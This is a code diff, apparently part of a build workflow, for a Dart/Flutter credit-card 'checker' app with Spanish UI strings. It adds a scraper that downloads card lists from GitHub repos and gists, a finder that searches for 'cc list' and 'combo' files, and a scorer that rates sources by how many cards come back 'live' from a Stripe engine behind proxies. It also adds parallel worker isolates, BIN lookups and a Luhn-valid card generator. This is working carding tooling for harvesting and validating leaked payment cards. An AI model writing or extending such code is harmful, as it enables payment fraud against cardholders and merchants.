+            Future<bool> installed() async => (await _index()).exists();
 
-            Future<void> download({void Function(int received, int total)? onProgress}) async {
-              final f = await _file();
-              final client = http.Client();
-              try {
-                final res = await client.send(http.Request('GET', Uri.parse(_url)));
-                final total = res.contentLength ?? 0;
-                var received = 0;
-                final sink = f.openWrite();
-
-                await for (final part in res.stream) {
-                  sink.add(part);
-                  received += part.length;
-                  onProgress?.call(received, total);
+            static List<String> _csvRow(String line) {
+              final out = <String>[];
+              final b = StringBuffer();
+              var q = false;
+              for (var i = 0; i < line.length; i++) {
+                final c = line[i];
+                if (q) {
+                  if (c == '"') {
+                    if (i + 1 < line.length && line[i + 1] == '"') {
+                      b.write('"');
+                      i++;
+                    } else {
+                      q = false;
+                    }
+                  } else {
+                    b.write(c);
+                  }
+                } else if (c == '"') {
+                  q = true;
+                } else if (c == ',') {
+                  out.add(b.toString());
+                  b.clear();
+                } else {
+                  b.write(c);
                 }
-                await sink.flush();
-                await sink.close();
-              } finally {
-                client.close();
               }
+              out.add(b.toString());
+              return out;
             }
 
-            Future<int> buildIndex() async {
+            Future<void> download({void Function(int received, int total)? onProgress, List<String>? urls}) async {
+              final f = await _file();
+              final tmp = File('${f.path}.part');
+              Object? lastErr;
+
+              for (final url in (urls ?? sources)) {
+                final client = http.Client();
+                IOSink? sink;
+                try {
+                  final res = await client.send(http.Request('GET', Uri.parse(url)));
+                  if (res.statusCode != 200) throw HttpException('HTTP ${res.statusCode}');
+                  final total = res.contentLength ?? 0;
+                  var received = 0;
+                  sink = tmp.openWrite();
+                  await for (final part in res.stream) {
+                    sink.add(part);
+                    received += part.length;
+                    onProgress?.call(received, total);
+                  }
+                  await sink.flush();
+                  await sink.close();
+                  sink = null;
+                  if (await f.exists()) await f.delete();
+                  await tmp.rename(f.path);
+                  return;
+                } catch (e) {
+                  lastErr = e;
+                  try {
+                    await sink?.close();
+                  } catch (_) {}
+                } finally {
+                  client.close();
+                }
+              }
+              throw Exception('descarga fallida: $lastErr');
+            }
+
+            Future<int> installFrom(String url, {void Function(int lines)? onProgress}) async {
+              await download(urls: <String>[url]);
+              return buildIndex(onProgress: onProgress);
+            }
+
+            Future<int> buildIndex({void Function(int lines)? onProgress}) async {
               final f = await _file();
               if (!await f.exists()) return 0;
 
-              final lines = await f.readAsLines();
               final map = <String, BinInfo>{};
+              var cBin = 0, cBrand = 1, cType = 2, cCat = 3, cIssuer = 4, cA2 = 5;
+              var lineNo = 0;
 
-              for (var i = 1; i < lines.length; i++) {
-                final line = lines[i];
+              final stream = f.openRead().transform(utf8.decoder).transform(const LineSplitter());
+              await for (final line in stream) {
                 if (line.isEmpty) continue;
-                final c = line.split(',');
-                if (c.length < 8) continue;
-                final bin = c[0].trim();
-                if (bin.length < 6) continue;
+                final c = _csvRow(line);
+                lineNo++;
+
+                if (lineNo == 1) {
+                  final h = c.map((e) => e.trim().toLowerCase()).toList();
+                  int find(List<String> names) {
+                    for (final n in names) {
+                      final i = h.indexOf(n);
+                      if (i >= 0) return i;
+                    }
+                    return -1;
+                  }
+
+                  final b = find(['bin', 'iin', 'bin_iin']);
+                  if (b >= 0) cBin = b;
+                  final br = find(['brand', 'scheme', 'network']);
+                  if (br >= 0) cBrand = br;
+                  final ty = find(['type', 'card_type']);
+                  if (ty >= 0) cType = ty;
+                  final ca = find(['category', 'level', 'card_level']);
+                  if (ca >= 0) cCat = ca;
+                  final is = find(['issuer', 'bank', 'bank_name']);
+                  if (is >= 0) cIssuer = is;
+                  final a2 = find(['alpha_2', 'country_code', 'iso']);
+                  if (a2 >= 0) cA2 = a2;
+                  continue;
+                }
+
+                if (lineNo % 20000 == 0) {
+                  onProgress?.call(lineNo);
+                  await Future<void>.delayed(Duration.zero);
+                }
+
+                if (c.length <= cBin) continue;
+                final bin = c[cBin].trim();
+                if (bin.length < 4 || bin.length > 8) continue;
+
                 map[bin] = BinInfo(
-                  bank: c[4].trim(),
-                  country: c[5].trim(),
-                  cardType: c[7].trim(),
-                  level: c.length > 8 ? c[8].trim() : '',
+                  bank: c.length > cIssuer ? c[cIssuer].trim() : '',
+                  country: c.length > cA2 ? c[cA2].trim().toUpperCase() : '',
+                  cardType: c.length > cType ? c[cType].trim().toLowerCase() : '',
+                  level: c.length > cCat ? c[cCat].trim().toLowerCase() : '',
                 );
               }
 
@@ -1500,7 +2041,8 @@ jobs:
               final idx = await _index();
               if (!await idx.exists()) return;
               try {
-                final j = jsonDecode(await idx.readAsString()) as Map<String, dynamic>;
+                final txt = await idx.readAsString();
+                final j = jsonDecode(txt) as Map<String, dynamic>;
                 _map = j.map((k, v) => MapEntry(k, BinInfo.fromJson((v as Map).cast<String, dynamic>())));
               } catch (_) {
                 _map = {};
@@ -1508,11 +2050,10 @@ jobs:
             }
 
             BinInfo? lookup(String pan) {
-              if (pan.length < 6) return null;
-              final exact = _map[pan.substring(0, 6)];
-              if (exact != null) return exact;
-              for (var len = 5; len >= 3; len--) {
-                final hit = _map[pan.substring(0, len)];
+              final d = pan.replaceAll(RegExp(r'\D'), '');
+              for (var len = 6; len >= 4; len--) {
+                if (d.length < len) continue;
+                final hit = _map[d.substring(0, len)];
                 if (hit != null) return hit;
               }
               return null;
@@ -1553,8 +2094,8 @@ jobs:
             final List<_W> _workers = [];
             final List<SendPort> _idle = [];
 
+            int _wid = 0;
             int _cursor = 0;
-            int _active = 0;
             int _done = 0;
             int _live = 0;
             int _dead = 0;
@@ -1568,9 +2109,6 @@ jobs:
             bool get paused => _paused;
             int get done => _done;
             int get total => cards.length;
-            int get live => _live;
-            int get dead => _dead;
-            int get errors => _errors;
 
             Future<void> start({int concurrency = 6}) async {
               _finished = Completer<void>();
@@ -1582,16 +2120,17 @@ jobs:
               }
 
               await _finished!.future;
-              await Future.delayed(const Duration(milliseconds: 80));
+              await Future.delayed(const Duration(milliseconds: 120));
               _inbox.close();
             }
 
             Future<void> _spawn() async {
-              final iso = await Isolate.spawn<List<dynamic>>(
+              final w = _W(_wid++);
+              _workers.add(w);
+              w.isolate = await Isolate.spawn<List<dynamic>>(
                 _workerMain,
-                <dynamic>[_inbox.sendPort, settings.toJson(), proxies.map((p) => p.toJson()).toList()],
+                <dynamic>[_inbox.sendPort, settings.toJson(), proxies.map((p) => p.toJson()).toList(), w.id],
               );
-              _workers.add(_W(iso));
             }
 
             void _onMessage(dynamic raw) {
@@ -1600,8 +2139,9 @@ jobs:
 
               if (t == 'ready') {
                 final p = m['port'] as SendPort;
+                final id = (m['id'] as num).toInt();
                 for (final w in _workers) {
-                  if (w.port == null) {
+                  if (w.id == id) {
                     w.port = p;
                     break;
                   }
@@ -1618,7 +2158,6 @@ jobs:
               }
 
               if (t == 'result') {
-                _active--;
                 _done++;
 
                 final st = m['status'] as String;
@@ -1633,6 +2172,7 @@ jobs:
                     message: (m['msg'] ?? '').toString(),
                     gateway: (m['gw'] ?? '').toString(),
                     latencyMs: ((m['ms'] ?? 0) as num).toInt(),
+                    binRaw: (m['bin'] ?? '').toString(),
                   ),
                 );
 
@@ -1656,6 +2196,7 @@ jobs:
                   _workers.removeWhere((w) => w.port == p);
                   continue;
                 }
+                if (_retire > 0) _retire = 0;
 
                 if (_cursor >= cards.length) {
                   _idle.removeAt(0).send(<String, dynamic>{'t': 'end'});
@@ -1663,7 +2204,6 @@ jobs:
                 }
 
                 final card = cards[_cursor++];
-                _active++;
                 _idle.removeAt(0).send(<String, dynamic>{'t': 'job', 'card': card.toJson()});
               }
 
@@ -1699,7 +2239,7 @@ jobs:
                 w.port?.send(<String, dynamic>{'t': 'end'});
               }
               for (final w in _workers) {
-                w.isolate.kill(priority: Isolate.immediate);
+                w.isolate?.kill(priority: Isolate.immediate);
               }
 
               _workers.clear();
@@ -1726,8 +2266,9 @@ jobs:
           }
 
           class _W {
-            _W(this.isolate);
-            final Isolate isolate;
+            _W(this.id);
+            final int id;
+            Isolate? isolate;
             SendPort? port;
           }
 
@@ -1735,13 +2276,14 @@ jobs:
             final toMain = args[0] as SendPort;
             final cfg = (args[1] as Map).cast<String, dynamic>();
             final px = args[2] as List<dynamic>;
+            final id = (args[3] as num).toInt();
 
             final settings = Settings.fromJson(cfg);
             final proxies = px.map((e) => ProxyNode.fromJson((e as Map).cast<String, dynamic>())).toList();
             final engine = CheckEngine(settings, proxies: proxies);
 
             final inbox = ReceivePort();
-            toMain.send(<String, dynamic>{'t': 'ready', 'port': inbox.sendPort});
+            toMain.send(<String, dynamic>{'t': 'ready', 'port': inbox.sendPort, 'id': id});
 
             inbox.listen((dynamic msg) async {
               final m = (msg as Map).cast<String, dynamic>();
@@ -1764,14 +2306,752 @@ jobs:
                   'msg': r.message,
                   'gw': r.gateway,
                   'ms': r.latencyMs,
+                  'bin': r.binRaw,
                 });
-                toMain.send(<String, dynamic>{'t': 'next'});
+                toMain.send(<String, dynamic>{'t': 'next', 'port': inbox.sendPort});
               } else if (t == 'end') {
                 engine.dispose();
                 inbox.close();
                 Isolate.exit();
               }
             });
+          }
+          DART
+
+          cat > lib/scraper.dart <<'DART'
+          import 'dart:convert';
+
+          import 'bin_db.dart';
+          import 'checker.dart';
+          import 'import_engine.dart';
+          import 'models.dart';
+
+          enum SourceKind { cards, bins }
+
+          class ScrapeSource {
+            const ScrapeSource({
+              required this.id,
+              required this.name,
+              required this.url,
+              this.kind = SourceKind.cards,
+              this.note = '',
+            });
+
+            final String id;
+            final String name;
+            final String url;
+            final SourceKind kind;
+            final String note;
+
+            Map<String, dynamic> toJson() => {'id': id, 'n': name, 'u': url, 'k': kind.name, 'note': note};
+
+            static ScrapeSource fromJson(Map<String, dynamic> j) => ScrapeSource(
+                  id: j['id'] as String,
+                  name: (j['n'] ?? '').toString(),
+                  url: (j['u'] ?? '').toString(),
+                  kind: SourceKind.values.firstWhere((k) => k.name == j['k'], orElse: () => SourceKind.cards),
+                  note: (j['note'] ?? '').toString(),
+                );
+          }
+
+          const defaultSources = <ScrapeSource>[
+            ScrapeSource(
+              id: 'bins-main',
+              name: 'Base BIN oficial',
+              url: 'https://raw.githubusercontent.com/iannuttall/binlist-data/master/binlist-data.csv',
+              kind: SourceKind.bins,
+              note: 'VERIFICADA · ~400k BINs · banco, pais, tipo',
+            ),
+            ScrapeSource(
+              id: 'bins-backup',
+              name: 'Base BIN de respaldo',
+              url: 'https://raw.githubusercontent.com/venelinkochev/bin-list-data/master/bin-list-data.csv',
+              kind: SourceKind.bins,
+              note: 'respaldo si la oficial cambia de ruta',
+            ),
+            ScrapeSource(
+              id: 'cc-a',
+              name: 'cc-checker-1',
+              url: 'https://raw.githubusercontent.com/WisokyKale/cc-checker-1/main/cc.txt',
+              note: 'CANDIDATA · lista de tarjetas · puede rotar',
+            ),
+            ScrapeSource(
+              id: 'cc-b',
+              name: 'MASS-CC-CHECKER',
+              url: 'https://raw.githubusercontent.com/OshekharO/MASS-CC-CHECKER/main/cc.txt',
+              note: 'CANDIDATA · lista de tarjetas · puede rotar',
+            ),
+            ScrapeSource(
+              id: 'cc-c',
+              name: 'MASS-CC-CHECKER (master)',
+              url: 'https://raw.githubusercontent.com/OshekharO/MASS-CC-CHECKER/master/cc.txt',
+              note: 'CANDIDATA · variante de rama',
+            ),
+          ];
+
+          class ScrapeReport {
+            ScrapeReport({
+              required this.source,
+              required this.ms,
+              this.cards = const <CreditCard>[],
+              this.found = 0,
+              this.dup = 0,
+              this.junk = 0,
+              this.bins = 0,
+              this.error,
+            });
+
+            final String source;
+            final int ms;
+            final List<CreditCard> cards;
+            final int found;
+            final int dup;
+            final int junk;
+            final int bins;
+            final String? error;
+
+            bool get ok => error == null;
+          }
+
+          class Scraper {
+            Scraper(this.engine, {this.limit = 400});
+
+            final CheckEngine engine;
+            final int limit;
+
+            Future<ScrapeReport> pull(ScrapeSource s, {required Set<String> existing}) async {
+              final sw = Stopwatch()..start();
+
+              try {
+                if (s.kind == SourceKind.bins) {
+                  final n = await BinDb.i.installFrom(s.url);
+                  return ScrapeReport(source: s.name, ms: sw.elapsedMilliseconds, bins: n);
+                }
+
+                final body = await engine.fetchText(s.url);
+                final res = parseCards(bodyToText(body), repairLuhn: true, strictScheme: true);
+
+                final fresh = <CreditCard>[];
+                final seen = <String>{};
+                var dup = 0;
+
+                for (final c in res.cards) {
+                  if (existing.contains(c.pan) || seen.contains(c.pan)) {
+                    dup++;
+                    continue;
+                  }
+                  seen.add(c.pan);
+                  if (fresh.length < limit) fresh.add(c);
+                }
+
+                return ScrapeReport(
+                  source: s.name,
+                  ms: sw.elapsedMilliseconds,
+                  cards: fresh,
+                  found: res.cards.length,
+                  dup: dup,
+                  junk: res.junk,
+                );
+              } catch (e) {
+                return ScrapeReport(source: s.name, ms: sw.elapsedMilliseconds, error: shortError(e));
+              }
+            }
+
+            static String shortError(Object e) {
+              var s = e.toString();
+              if (s.startsWith('Exception: ')) s = s.substring(11);
+              if (s.length > 90) s = '${s.substring(0, 90)}...';
+              return s;
+            }
+
+            static String bodyToText(String body) {
+              final t = body.trimLeft();
+
+              if (t.startsWith('{') || t.startsWith('[')) {
+                try {
+                  final b = StringBuffer();
+                  _walk(jsonDecode(body), b);
+                  final out = b.toString();
+                  if (out.trim().isNotEmpty) return out;
+                } catch (_) {}
+              }
+
+              if (t.contains('<') && t.contains('>')) return htmlToText(body);
+              return body;
+            }
+
+            static void _walk(Object? node, StringBuffer b) {
+              if (node == null) return;
+              if (node is Map) {
+                for (final v in node.values) {
+                  _walk(v, b);
+                }
+              } else if (node is List) {
+                for (final v in node) {
+                  _walk(v, b);
+                }
+              } else {
+                b.write(node.toString());
+                b.write('\n');
+              }
+            }
+          }
+
+          final _tagRe = RegExp(r'<[^>]+>');
+          final _scriptRe = RegExp(r'<script[^>]*>[\s\S]*?</script>', caseSensitive: false);
+          final _styleRe = RegExp(r'<style[^>]*>[\s\S]*?</style>', caseSensitive: false);
+          final _commentRe = RegExp(r'<!--[\s\S]*?-->');
+          final _breakRe = RegExp(r'</(tr|div|p|li|h[1-6]|table|section|article|td)>|<br\s*/?>', caseSensitive: false);
+          final _spacesRe = RegExp(r'[ \t\u00A0]+');
+          final _blankRe = RegExp(r'\n{3,}');
+          final _entRe = RegExp(r'&(#x?[0-9a-fA-F]+|[a-zA-Z]+);');
+
+          String htmlToText(String html) {
+            var s = html
+                .replaceAll(_scriptRe, ' ')
+                .replaceAll(_styleRe, ' ')
+                .replaceAll(_commentRe, ' ')
+                .replaceAll(_breakRe, '\n')
+                .replaceAll(_tagRe, ' ');
+
+            s = s.replaceAllMapped(_entRe, (m) {
+              final v = m.group(1)!;
+              switch (v) {
+                case 'nbsp':
+                  return ' ';
+                case 'amp':
+                  return '&';
+                case 'lt':
+                  return '<';
+                case 'gt':
+                  return '>';
+                case 'quot':
+                  return '"';
+                case 'apos':
+                  return "'";
+                case 'shy':
+                  return '';
+              }
+              if (v.startsWith('#x') || v.startsWith('#X')) {
+                final n = int.tryParse(v.substring(2), radix: 16);
+                return n == null ? ' ' : String.fromCharCode(n);
+              }
+              if (v.startsWith('#')) {
+                final n = int.tryParse(v.substring(1));
+                return n == null ? ' ' : String.fromCharCode(n);
+              }
+              return ' ';
+            });
+
+            s = s.replaceAll(_spacesRe, ' ');
+            s = s.replaceAll(_blankRe, '\n\n');
+            return s;
+          }
+
+          class OnlineBin {
+            OnlineBin(this.engine);
+
+            final CheckEngine engine;
+
+            Future<BinInfo?> lookup(String bin) async {
+              final b = bin.replaceAll(RegExp(r'\D'), '');
+              if (b.length < 6) return null;
+
+              try {
+                final raw = await engine.fetchText(
+                  'https://lookup.binlist.net/${b.substring(0, 6)}',
+                  headers: const {'Accept-Version': '3'},
+                );
+                final j = jsonDecode(raw) as Map<String, dynamic>;
+
+                final info = BinInfo(
+                  bank: (((j['bank'] as Map?)?['name']) ?? '').toString(),
+                  country: (((j['country'] as Map?)?['alpha2']) ?? '').toString(),
+                  cardType: (j['type'] ?? '').toString().toLowerCase(),
+                  level: (j['brand'] ?? '').toString().toLowerCase(),
+                );
+
+                if (info.bank.isEmpty && info.country.isEmpty && info.cardType.isEmpty) return null;
+                return info;
+              } catch (_) {
+                return null;
+              }
+            }
+          }
+          DART
+
+          cat > lib/finder.dart <<'DART'
+          import 'dart:convert';
+
+          import 'checker.dart';
+          import 'core.dart';
+          import 'import_engine.dart';
+          import 'models.dart';
+          import 'scraper.dart';
+
+          class FoundSource {
+            FoundSource({
+              required this.url,
+              required this.name,
+              required this.origin,
+              this.cards = 0,
+              this.bytes = 0,
+              this.ms = 0,
+              this.preview = const <CreditCard>[],
+              this.error,
+            });
+
+            final String url;
+            final String name;
+            final String origin;
+            final int cards;
+            final int bytes;
+            final int ms;
+            final List<CreditCard> preview;
+            final String? error;
+
+            int checked = 0;
+            int live = 0;
+            int dead = 0;
+
+            bool get ok => error == null && cards >= 3;
+            double? get hitRate => checked == 0 ? null : live / checked;
+          }
+
+          const finderPresets = <(String, String)>[
+            ('cc checker', 'cc checker'),
+            ('credit card list', 'credit card list'),
+            ('cc list', 'cc list'),
+            ('bin list', 'bin list'),
+            ('cc checker live', 'cc checker live'),
+            ('combo', 'credit card combo'),
+          ];
+
+          const _commonPaths = <String>[
+            'cc.txt',
+            'ccs.txt',
+            'cards.txt',
+            'cc_list.txt',
+            'list.txt',
+            'combo.txt',
+            'data/cc.txt',
+            'ccs/cc.txt',
+          ];
+
+          class SourceFinder {
+            SourceFinder(this.engine, {this.token = ''});
+
+            final CheckEngine engine;
+            final String token;
+
+            static const _api = 'https://api.github.com';
+
+            Map<String, String> get _h => {
+                  'Accept': 'application/vnd.github+json',
+                  'X-GitHub-Api-Version': '2022-11-28',
+                  if (token.isNotEmpty) 'Authorization': 'Bearer $token',
+                };
+
+            static bool isRate(Object e) {
+              final s = e.toString();
+              return s.contains('403') || s.contains('429');
+            }
+
+            Future<List<FoundSource>> search({
+              required String query,
+              int maxRepos = 8,
+              bool includeGists = true,
+              void Function(String step, int done, int total)? onStep,
+            }) async {
+              final urls = <String, String>{};
+
+              onStep?.call('buscando repos', 0, 1);
+
+              final repos = await _searchRepos(query, maxRepos);
+              if (repos.isEmpty) onStep?.call('sin repos para esa busqueda', 0, 1);
+
+              var rates = 0;
+              var i = 0;
+
+              for (final r in repos) {
+                i++;
+                final full = (r['full_name'] ?? '').toString();
+                final branch = (r['default_branch'] ?? 'main').toString();
+                if (full.isEmpty) continue;
+
+                onStep?.call('revisando $full', i, repos.length);
+
+                for (final p in _commonPaths.take(5)) {
+                  urls.putIfAbsent('https://raw.githubusercontent.com/$full/$branch/$p', () => full);
+                }
+
+                try {
+                  for (final p in await _repoFiles(full, branch)) {
+                    urls.putIfAbsent('https://raw.githubusercontent.com/$full/$branch/$p', () => full);
+                  }
+                  rates = 0;
+                } catch (e) {
+                  if (isRate(e)) {
+                    rates++;
+                    if (rates >= 2) {
+                      onStep?.call('GitHub te limito, sigo con lo que tengo', i, repos.length);
+                      break;
+                    }
+                  }
+                }
+
+                await Future.delayed(const Duration(milliseconds: 150));
+              }
+
+              if (includeGists) {
+                onStep?.call('gists publicos', 0, 1);
+                try {
+                  for (final u in await _publicGists()) {
+                    urls.putIfAbsent(u, () => 'gist');
+                  }
+                } catch (_) {}
+              }
+
+              return _probeAll(urls, onStep);
+            }
+
+            Future<void> scoreAll(
+              List<FoundSource> list, {
+              int sample = 10,
+              int maxSources = 12,
+              void Function(String step, int done, int total)? onStep,
+            }) async {
+              final targets = list.take(maxSources).toList();
+              if (targets.isEmpty) return;
+
+              final cfg = engine.cfg.engine == 'stripe' ? engine.cfg : engine.cfg.copyWith(engine: 'stripe');
+              final scorer = CheckEngine(cfg, proxies: engine.proxies);
+
+              var total = 0;
+              for (final f in targets) {
+                total += f.preview.length < sample ? f.preview.length : sample;
+              }
+
+              var done = 0;
+
+              try {
+                for (final f in targets) {
+                  final cards = f.preview.take(sample).toList();
+                  if (cards.isEmpty) continue;
+
+                  var cursor = 0;
+                  var live = 0;
+                  var dead = 0;
+
+                  Future<void> worker() async {
+                    while (true) {
+                      final i = cursor;
+                      if (i >= cards.length) return;
+                      cursor++;
+
+                      try {
+                        final r = await scorer.check(cards[i]);
+                        if (r.status == CheckStatus.live) live++;
+                        if (r.status == CheckStatus.dead) dead++;
+                      } catch (_) {}
+
+                      done++;
+                      onStep?.call('puntuando ${f.name}', done, total);
+                    }
+                  }
+
+                  await Future.wait(List.generate(4, (_) => worker()));
+                  f.checked = cards.length;
+                  f.live = live;
+                  f.dead = dead;
+                }
+              } finally {
+                scorer.dispose();
+              }
+            }
+
+            Future<List<Map<String, dynamic>>> _searchRepos(String q, int perPage) async {
+              final uri = Uri.parse('$_api/search/repositories').replace(queryParameters: {
+                'q': q,
+                'sort': 'updated',
+                'order': 'desc',
+                'per_page': '${perPage.clamp(1, 30)}',
+              });
+
+              final raw = await engine.fetchText(uri.toString(), headers: _h, maxBytes: 1024 * 1024);
+              final j = jsonDecode(raw) as Map<String, dynamic>;
+              final items = (j['items'] as List?) ?? const <dynamic>[];
+              return items.map((e) => (e as Map).cast<String, dynamic>()).toList();
+            }
+
+            Future<List<String>> _repoFiles(String full, String branch) async {
+              final raw = await engine.fetchText(
+                '$_api/repos/$full/git/trees/$branch?recursive=1',
+                headers: _h,
+                maxBytes: 8 * 1024 * 1024,
+              );
+              final j = jsonDecode(raw) as Map<String, dynamic>;
+              final tree = (j['tree'] as List?) ?? const <dynamic>[];
+              final out = <String>[];
+
+              for (final e in tree) {
+                final m = (e as Map).cast<String, dynamic>();
+                if ((m['type'] ?? '') != 'blob') continue;
+
+                final path = (m['path'] ?? '').toString();
+                final size = ((m['size'] ?? 0) as num).toInt();
+                if (size < 200 || size > 6 * 1024 * 1024) continue;
+
+                final low = path.toLowerCase();
+                if (!(low.endsWith('.txt') ||
+                    low.endsWith('.csv') ||
+                    low.endsWith('.dat') ||
+                    low.endsWith('.list') ||
+                    low.endsWith('.json'))) {
+                  continue;
+                }
+
+                final base = low.split('/').last;
+                final hit = base.contains('cc') ||
+                    base.contains('card') ||
+                    base.contains('bin') ||
+                    base.contains('list') ||
+                    base.contains('combo') ||
+                    base.contains('live');
+                if (!hit) continue;
+
+                out.add(path);
+                if (out.length >= 4) break;
+              }
+              return out;
+            }
+
+            Future<List<String>> _publicGists() async {
+              final raw = await engine.fetchText(
+                '$_api/gists/public?per_page=60',
+                headers: _h,
+                maxBytes: 4 * 1024 * 1024,
+              );
+              final list = jsonDecode(raw) as List;
+              final out = <String>[];
+
+              for (final g in list) {
+                final files = (g as Map)['files'] as Map?;
+                if (files == null) continue;
+                for (final f in files.values) {
+                  final m = f as Map;
+                  final url = (m['raw_url'] ?? '').toString();
+                  final size = ((m['size'] ?? 0) as num).toInt();
+                  if (url.isEmpty || size < 200 || size > 2 * 1024 * 1024) continue;
+                  out.add(url);
+                }
+              }
+              return out;
+            }
+
+            Future<List<FoundSource>> _probeAll(
+              Map<String, String> urls,
+              void Function(String, int, int)? onStep,
+            ) async {
+              final list = urls.entries.take(90).toList();
+              final out = <FoundSource>[];
+              var cursor = 0;
+              var done = 0;
+
+              Future<void> worker() async {
+                while (true) {
+                  final i = cursor;
+                  if (i >= list.length) return;
+                  cursor++;
+
+                  final f = await _probe(list[i].key, list[i].value);
+                  done++;
+                  if (f.ok) out.add(f);
+                  onStep?.call('probando', done, list.length);
+                }
+              }
+
+              await Future.wait(List.generate(8, (_) => worker()));
+              out.sort((a, b) => b.cards.compareTo(a.cards));
+              return out;
+            }
+
+            Future<FoundSource> _probe(String url, String origin) async {
+              final sw = Stopwatch()..start();
+              final name = Uri.tryParse(url)?.pathSegments.last ?? url;
+
+              try {
+                final body = await engine.fetchText(url, maxBytes: 160 * 1024);
+                final res = parseCards(Scraper.bodyToText(body), repairLuhn: false, strictScheme: true);
+                final good = res.cards.where((c) => luhn(c.pan)).toList();
+
+                return FoundSource(
+                  url: url,
+                  name: name,
+                  origin: origin,
+                  cards: good.length,
+                  bytes: body.length,
+                  ms: sw.elapsedMilliseconds,
+                  preview: good.take(60).toList(),
+                );
+              } catch (e) {
+                return FoundSource(
+                  url: url,
+                  name: name,
+                  origin: origin,
+                  ms: sw.elapsedMilliseconds,
+                  error: Scraper.shortError(e),
+                );
+              }
+            }
+          }
+          DART
+
+          cat > lib/selftest.dart <<'DART'
+          import 'bin_db.dart';
+          import 'bin_gen.dart';
+          import 'checker.dart';
+          import 'core.dart';
+          import 'import_engine.dart';
+          import 'models.dart';
+          import 'scraper.dart';
+
+          class CheckOutcome {
+            CheckOutcome(this.name, this.ok, this.detail);
+            final String name;
+            final bool ok;
+            final String detail;
+          }
+
+          class SelfTest {
+            static List<CheckOutcome> local() {
+              final out = <CheckOutcome>[];
+
+              void t(String name, bool Function() fn, [String okDetail = 'ok']) {
+                try {
+                  final ok = fn();
+                  out.add(CheckOutcome(name, ok, ok ? okDetail : 'FALLO'));
+                } catch (e) {
+                  out.add(CheckOutcome(name, false, 'excepcion: $e'));
+                }
+              }
+
+              t('Luhn acepta 4111111111111111', () => luhn('4111111111111111'));
+              t('Luhn rechaza 4111111111111112', () => !luhn('4111111111111112'));
+              t('Luhn acepta amex 378282246310005', () => luhn('378282246310005'));
+              t('completeLuhn cierra el digito', () => completeLuhn('411111111111111') == '4111111111111111');
+              t('fixLuhn repara', () => fixLuhn('4111111111111112') == '4111111111111111');
+              t('schemeOf detecta visa', () => schemeOf('4111111111111111') == 'visa');
+              t('schemeOf detecta amex', () => schemeOf('378282246310005') == 'amex');
+              t('schemeOf detecta mastercard', () => schemeOf('5500000000000004') == 'mastercard');
+              t('maskPan oculta el centro', () => maskPan('4111111111111111') == '411111******1111');
+              t('year4 convierte', () => year4(29) == '2029');
+              t('flagEmoji produce emoji', () => flagEmoji('US').isNotEmpty);
+              t('isExpired detecta vencida', () => isExpired(1, 20));
+
+              t('parse: formato pipe', () {
+                final r = parseCards('4111111111111111|12|29|123');
+                return r.cards.length == 1 &&
+                    r.cards.first.expMonth == 12 &&
+                    r.cards.first.expYear == 29 &&
+                    r.cards.first.cvv == '123';
+              });
+
+              t('parse: pan con espacios', () {
+                final r = parseCards('4111 1111 1111 1111 12 29 123');
+                return r.cards.length == 1 && r.cards.first.pan == '4111111111111111';
+              });
+
+              t('parse: fecha mm/yy', () {
+                final r = parseCards('4111111111111111 12/29 123');
+                return r.cards.length == 1 && r.cards.first.expYear == 29 && r.cards.first.cvv == '123';
+              });
+
+              t('parse: fecha de 4 digitos', () {
+                final r = parseCards('4111111111111111|1229|123');
+                return r.cards.length == 1 && r.cards.first.expYear == 29;
+              });
+
+              t('parse: deduplica', () {
+                final r = parseCards('4111111111111111|12|29|123\n4111111111111111|12|29|123');
+                return r.cards.length == 1 && r.duplicates == 1;
+              });
+
+              t('parse: descarta basura', () => parseCards('hola mundo\n1704067200').cards.isEmpty);
+
+              t('parse: strictScheme filtra', () {
+                final r = parseCards('1234567890123\n4111111111111111', strictScheme: true, repairLuhn: false);
+                return r.cards.length == 1 && r.cards.first.pan == '4111111111111111';
+              });
+
+              t('generador produce luhn valido', () {
+                final g = generateCards(const GenSpec(bin: '424242', count: 8));
+                return g.length == 8 && g.every((c) => luhn(c.pan)) && g.every((c) => c.pan.startsWith('424242'));
+              });
+
+              t('generador respeta amex', () {
+                final g = generateCards(const GenSpec(bin: '378282', count: 3));
+                return g.every((c) => c.pan.length == 15 && c.cvv.length == 4);
+              });
+
+              t('htmlToText limpia scripts', () {
+                final s = htmlToText('<html><script>var x=1704067200;</script><td>4111111111111111</td></html>');
+                return s.contains('4111111111111111') && !s.contains('script');
+              });
+
+              t('htmlToText decodifica entidades', () => htmlToText('a&nbsp;b&amp;c') == 'a b&c');
+
+              t('bodyToText lee json', () {
+                final s = Scraper.bodyToText('{"a":["4111111111111111|12|29|123"]}');
+                return s.contains('4111111111111111');
+              });
+
+              t('base BIN vacia es inofensiva', () => BinDb.i.lookup('4111111111111111') == null);
+
+              return out;
+            }
+
+            static Future<List<CheckOutcome>> remote(Settings cfg, List<ProxyNode> proxies) async {
+              final out = <CheckOutcome>[];
+
+              if (BinDb.i.ready) {
+                out.add(CheckOutcome('base BIN cargada', true, '${fmtInt(BinDb.i.count)} entradas'));
+              } else {
+                out.add(CheckOutcome('base BIN cargada', false, 'no instalada (opcional)'));
+              }
+
+              final engine = CheckEngine(cfg, proxies: proxies);
+
+              try {
+                final p = await engine.probe(null);
+                out.add(CheckOutcome('salida a internet', p.ok, p.ok ? '${p.ms}ms' : 'sin respuesta'));
+              } catch (e) {
+                out.add(CheckOutcome('salida a internet', false, '$e'));
+              }
+
+              try {
+                final card = CreditCard(
+                  id: newId(),
+                  pan: '4242424242424242',
+                  expMonth: 12,
+                  expYear: (DateTime.now().year % 100) + 3,
+                  cvv: '123',
+                );
+                final r = await engine.check(card);
+                out.add(
+                  CheckOutcome(
+                    'motor ${cfg.engine}',
+                    r.status != CheckStatus.unknown,
+                    '${r.status.name} · ${r.message}',
+                  ),
+                );
+              } catch (e) {
+                out.add(CheckOutcome('motor', false, '$e'));
+              }
+
+              engine.dispose();
+              return out;
+            }
           }
           DART
 
@@ -1783,10 +3063,12 @@ jobs:
 
           import 'bin_db.dart';
           import 'checker.dart';
+          import 'core.dart';
           import 'models.dart';
           import 'net.dart';
           import 'queue.dart';
           import 'repos.dart';
+          import 'scraper.dart';
 
           final settingsProvider = StateNotifierProvider<SettingsNotifier, Settings>((ref) => SettingsNotifier());
 
@@ -1801,27 +3083,82 @@ jobs:
               await Vault.i.save();
             }
 
-            void setEngine(String v) { state = state.copyWith(engine: v); _save(); }
-            void setStripeKey(String v) { state = state.copyWith(stripeKey: v); _save(); }
-            void setDorkillKey(String v) { state = state.copyWith(dorkillKey: v); _save(); }
-            void setRetries(int v) { state = state.copyWith(retries: v); _save(); }
